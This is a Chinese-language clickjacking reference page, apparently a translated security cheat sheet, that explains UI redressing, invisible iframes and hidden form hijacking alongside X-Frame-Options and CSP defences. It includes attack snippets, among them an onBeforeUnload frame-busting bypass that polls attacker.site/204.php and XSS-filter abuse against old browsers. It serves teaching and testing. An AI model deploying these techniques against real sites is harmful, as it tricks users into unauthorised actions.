# 点击劫持 (Clickjacking)

> 点击劫持是一种Web安全漏洞，恶意网站会诱使用户点击他们感知不到的内容，这可能导致用户在不知情或未经同意的情况下执行非预期的操作。用户可能会被欺骗执行各种非预期操作，例如输入密码、点击“删除我的账户”按钮、点赞帖子、删除帖子、评论博客等。换句话说，用户在合法网站上可以执行的所有操作都可以通过点击劫持来实现。

## 概述

* [工具](#工具)
* [方法论](#方法论)
    * [UI重绘](#ui重绘)
    * [隐形框架](#隐形框架)
    * [按钮/表单劫持](#按钮表单劫持)
    * [执行方法](#执行方法)
* [预防措施](#预防措施)
    * [实现X-Frame-Options头](#实现x-frame-options头)
    * [内容安全策略 (CSP)](#内容安全策略-csp)
    * [禁用JavaScript](#禁用javascript)
* [OnBeforeUnload事件](#onbeforeunload事件)
* [XSS过滤器](#xss过滤器)
    * [IE8 XSS过滤器](#ie8-xss过滤器)
    * [Chrome 4.0 XSSAuditor过滤器](#chrome-40-xssauditor过滤器)
* [挑战](#挑战)
* [实验室](#实验室)
* [参考文献](#参考文献)

## 工具

* [portswigger/burp](https://portswigger.net/burp)
* [zaproxy/zaproxy](https://github.com/zaproxy/zaproxy)
* [machine1337/clickjack](https://github.com/machine1337/clickjack)

## 方法论

### UI重绘

UI重绘是一种点击劫持技术，攻击者会在合法网站或应用程序之上叠加一个透明的UI元素。
透明的UI元素包含对用户视觉隐藏的恶意内容或操作。通过操控元素的透明度和位置，
攻击者可以诱使用户与隐藏内容交互，而用户却以为他们在与可见界面交互。

* **UI重绘的工作原理：**
    * 叠加透明元素：攻击者创建一个透明的HTML元素（通常是`<div>`），覆盖合法网站的整个可见区域。该元素使用CSS属性如`opacity: 0;`使其透明。
    * 定位和分层：通过设置CSS属性如`position: absolute; top: 0; left: 0;`，透明元素被定位以覆盖整个视口。由于它是透明的，用户看不到它。
    * 误导用户交互：攻击者在透明容器内放置欺骗性元素，例如假按钮、链接或表单。这些元素在被点击时执行操作，但用户由于透明覆盖层的存在而不知道它们的存在。
    * 用户交互：当用户与可见界面交互时，他们实际上在与隐藏元素交互，导致非预期的操作或未经授权的操作。

```html
<div style="opacity: 0; position: absolute; top: 0; left: 0; height: 100%; width: 100%;">
  <a href="malicious-link">点击我</a>
</div>
```

### 隐形框架

隐形框架是一种点击劫持技术，攻击者使用隐藏的iframe诱使用户无意中与另一个网站的内容交互。
这些iframe通过将其尺寸设置为零（高度：0；宽度：0；）并移除边框（边框：无；）来实现不可见性。
隐形框架内的内容可能是恶意的，例如钓鱼表单、恶意软件下载或任何其他有害操作。

* **隐形框架的工作原理：**
    * 创建隐藏的IFrame：攻击者在网页中包含一个`<iframe>`元素，将其尺寸设置为零并移除边框，使其对用户不可见。

      ```html
      <iframe src="malicious-site" style="opacity: 0; height: 0; width: 0; border: none;"></iframe>
      ```

    * 加载恶意内容：iframe的src属性指向由攻击者控制的恶意网站或资源。由于iframe是不可见的，因此内容在用户不知情的情况下静默加载。
    * 用户交互：攻击者在隐形iframe上叠加诱人的元素，让用户以为他们在与可见界面交互。例如，攻击者可能在隐形iframe上放置一个透明按钮。当用户点击按钮时，他们实际上是在点击iframe内的隐藏内容。
    * 非预期操作：由于用户不知道隐形iframe的存在，他们的交互可能导致非预期的操作，例如提交表单、点击恶意链接，甚至在未经同意的情况下进行金融交易。

### 按钮/表单劫持

按钮/表单劫持是一种点击劫持技术，攻击者诱使用户与不可见或隐藏的按钮/表单交互，从而在合法网站上执行非预期操作。通过在可见按钮或表单上叠加欺骗性元素，攻击者可以在用户不知情的情况下操纵其交互以执行恶意操作。

* **按钮/表单劫持的工作原理：**
    * 可见界面：攻击者向用户展示一个可见的按钮或表单，鼓励他们点击或与其交互。

    ```html
    <button onclick="submitForm()">点击我</button>
    ```

    * 不可见覆盖：攻击者在可见按钮或表单上叠加一个不可见或透明的元素，其中包含恶意操作，例如提交隐藏表单。

    ```html
    <form action="malicious-site" method="POST" id="hidden-form" style="display: none;">
    <!-- 隐藏表单字段 -->
    </form>
    ```

    * 欺骗性交互：当用户点击可见按钮时，他们实际上在与隐藏表单交互，由于不可见覆盖层的存在。表单被提交，可能导致未经授权的操作或数据泄露。

    ```html
    <button onclick="submitForm()">点击我</button>
    <form action="legitimate-site" method="POST" id="hidden-form">
      <!-- 隐藏表单字段 -->
    </form>
    <script>
      function submitForm() {
        document.getElementById('hidden-form').submit();
      }
    </script>
    ```

### 执行方法

* 创建隐藏表单：攻击者创建一个包含恶意输入字段的隐藏表单，目标是针对受害者网站上的漏洞操作。此表单对用户不可见。

```html
<form action="malicious-site" method="POST" id="hidden-form" style="display: none;">
  <input type="hidden" name="username" value="attacker">
  <input type="hidden" name="action" value="transfer-funds">
</form>
```

* 叠加可见元素：攻击者在其恶意页面上叠加一个可见元素（按钮或表单），鼓励用户与其交互。当用户点击可见元素时，他们不知不觉地触发了隐藏表单的提交。

```js
function submitForm() {
  document.getElementById('hidden-form').submit();
}
```

## 预防措施

### 实现X-Frame-Options头

通过实现X-Frame-Options头，并使用DENY或SAMEORIGIN指令，防止您的网站在未获得您许可的情况下嵌入iframe。

```apache
Header always append X-Frame-Options SAMEORIGIN
```

### 内容安全策略 (CSP)

使用CSP控制可以从哪些来源加载网站内容，包括脚本、样式和框架。
定义一个强大的CSP策略以防止未经授权的框架和外部资源加载。
HTML元标签示例：

```html
<meta http-equiv="Content-Security-Policy" content="frame-ancestors 'self';">
```

### 禁用JavaScript

* 由于这类客户端保护依赖于JavaScript帧破坏代码，如果受害者禁用了JavaScript或攻击者能够禁用JavaScript代码，则网页将没有任何针对点击劫持的保护机制。
* 有三种可以在框架中使用的停用技术：
    * Internet Explorer中的受限框架：从IE6开始，框架可以具有“security”属性，如果将其设置为“restricted”，则确保JavaScript代码、ActiveX控件和重定向到其他站点的功能在框架中不起作用。

    ```html
    <iframe src="http://目标网站" security="restricted"></iframe>
    ```

    * sandbox属性：HTML5引入了一个名为“sandbox”的新属性。它对加载到iframe中的内容施加了一组限制。目前，此属性仅与Chrome和Safari兼容。

    ```html
    <iframe src="http://目标网站" sandbox></iframe>
    ```

## OnBeforeUnload事件

* `onBeforeUnload`事件可用于规避帧破坏代码。当帧破坏代码试图通过在整个网页中加载URL而不是仅在iframe中加载URL来销毁iframe时，会调用此事件。处理函数返回一个字符串，提示用户确认是否要离开页面。当此字符串显示给用户时，用户很可能会取消导航，从而挫败目标的帧破坏尝试。

* 攻击者可以通过在顶层页面注册卸载事件来利用此攻击，以下为例代码：

```html
<h1>www.fictitious.site</h1>
<script>
    window.onbeforeunload = function() {
        return " 您想离开fictitious.site吗？";
    }
</script>
<iframe src="http://目标网站">
```

* 上述技术需要用户交互，但无需提示用户即可达到相同效果。为此，攻击者必须在`onBeforeUnload`事件处理程序中反复提交（例如每毫秒一次）导航请求至响应带有`"HTTP/1.1 204 No Content"`头的网页，以自动取消传入的导航请求。

204页面：

```php
<?php
    header("HTTP/1.1 204 No Content");
?>
```

攻击者页面：

```js
<script>
    var prevent_bust = 0;
    window.onbeforeunload = function() {
        prevent_bust++;
    };
    setInterval(
        function() {
            if (prevent_bust > 0) {
                prevent_bust -= 2;
                window.top.location = "http://attacker.site/204.php";
            }
        }, 1);
</script>
<iframe src="http://目标网站">
```

## XSS过滤器

### IE8 XSS过滤器

此过滤器可以查看通过浏览器的每个请求和响应的所有参数，并将它们与一组正则表达式进行比较以查找反射型XSS尝试。当过滤器识别出可能的XSS攻击时，它会禁用页面中的所有内联脚本，包括帧破坏脚本（外部脚本同样会被禁用）。因此，攻击者可以通过将帧破坏脚本的开头插入请求参数中来诱导误报。

```html
<script>
    if ( top != self ) {
        top.location = self.location;
    }
</script>
```

攻击者视角：

```html
<iframe src="http://目标网站/?param=<script>if">
```

### Chrome 4.0 XSSAuditor过滤器

它的行为与IE8 XSS过滤器略有不同，因为使用此过滤器时，攻击者可以通过在请求参数中传递代码来禁用特定的“脚本”。这使得框架页面可以专门针对包含帧破坏代码的单一片段，同时保留其他代码的完整性。

攻击者视角：

```html
<iframe src="http://目标网站/?param=if(top+!%3D+self)+%7B+top.location%3Dself.location%3B+%7D">
```

## 挑战

检查以下代码：

```html
<div style="position: absolute; opacity: 0;">
  <iframe src="https://合法网站.com/login" width="500" height="500"></iframe>
</div>
<button onclick="document.getElementsByTagName('iframe')[0].contentWindow.location='恶意网站.com';">点击我</button>
```

确定此代码片段中的点击劫持漏洞。识别隐藏的iframe如何利用用户点击按钮的行为，引导他们进入恶意网站。

## 实验室

* [OWASP WebGoat](https://owasp.org/www-project-webgoat/)
* [OWASP客户端点击劫持测试](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client_Side_Testing/09-Testing_for_Clickjacking)

## 参考文献

* [Clickjacker.io - Saurabh Banawar - 2020年5月10日](https://clickjacker.io)
* [点击劫持 - Gustav Rydstedt - 2020年4月28日](https://owasp.org/www-community/attacks/Clickjacking)
* [Synopsys点击劫持 - BlackDuck - 2019年11月29日](https://www.synopsys.com/glossary/what-is-clickjacking.html#B)
* [Web-Security点击劫持 - PortSwigger - 2019年10月12日](https://portswigger.net/web-security/clickjacking)